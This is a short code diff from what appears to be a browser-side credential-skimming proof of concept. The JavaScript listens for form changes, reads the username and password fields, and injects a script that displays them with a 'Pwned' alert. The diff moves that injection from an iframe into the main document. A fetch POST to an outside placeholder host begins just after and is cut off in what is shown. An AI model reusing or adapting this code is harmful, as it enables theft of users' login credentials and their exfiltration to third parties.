@@ -21,7 +21,7 @@ top.document.addEventListener('change', e => {
       pw = top.password.value;
       x = document.createElement('script');
       x.src = 'data:,alert("Pwned "+usr+" "+pw)';
-      pwn.contentWindow.document.body.appendChild(x)
+      document.body.appendChild(x)
       alert('Wow!, submitted usr password ' + usr + ' ' + pw);
 
       fetch('https://jsonplaceholder.typicode.com/posts', {
